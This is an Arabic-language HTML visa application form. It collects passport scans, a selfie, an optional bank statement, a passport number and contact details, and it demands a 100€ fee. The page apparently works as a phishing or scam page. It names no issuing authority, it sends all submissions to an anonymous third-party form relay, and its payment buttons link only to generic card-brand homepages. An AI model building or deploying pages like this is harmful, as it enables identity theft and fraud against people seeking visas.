<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>طلب التأشيرة</title>
<link rel="stylesheet" href="style.css">
</head>

<body>

<div class="container">

<form action="https://formsubmit.co/5a972c61f3a2684833aadaf20c6d7404" method="POST" enctype="multipart/form-data">

<div class="card">

<h2>📄 رفع الوثائق المطلوبة</h2>

<p>يرجى رفع نسخة واضحة من جواز السفر والصورة الشخصية</p>

<label>🛂 صورة جواز السفر</label>
<input type="file" name="passport_image" accept="image/*" required>

<label>📸 صورة شخصية</label>
<input type="file" name="photo" accept="image/*" required>

<label>📄 كشف الحساب البنكي (اختياري)</label>
<input type="file" name="bank_statement" accept="application/pdf,image/*">

</div>

<div class="card">

<h2>👤 البيانات الشخصية</h2>

<input name="name" placeholder="الاسم الكامل" required>
<input name="lastname" placeholder="اللقب" required>
<input name="birth" type="date" required>
<input name="passport_number" placeholder="رقم جواز السفر" required>
<input name="phone" placeholder="رقم الهاتف" required>
<input name="email" placeholder="البريد الإلكتروني" required>

</div>

<div class="card">

<h2>💳 الدفع (100€)</h2>

<p>اختر طريقة الدفع لإكمال الطلب</p>

<div style="display:flex;flex-wrap:wrap;gap:10px;justify-content:center;">

<a href="https://www.paypal.com" target="_blank">
<button type="button">PayPal</button>
</a>

<a href="https://www.visa.com" target="_blank">
<button type="button">Visa</button>
</a>

<a href="https://www.mastercard.com" target="_blank">
<button type="button">MasterCard</button>
</a>

</div>

<p style="color:gray;margin-top:10px;">
بعد الدفع سيتم التواصل معك لتأكيد الطلب
</p>

</div>

<div class="card">

<h2>📤 إرسال الطلب النهائي</h2>

<p>بإرسال الطلب أنت توافق على معالجة بياناتك</p>

<button type="submit">إرسال الطلب</button>

</div>

</form>

</div>

</body>
</html>
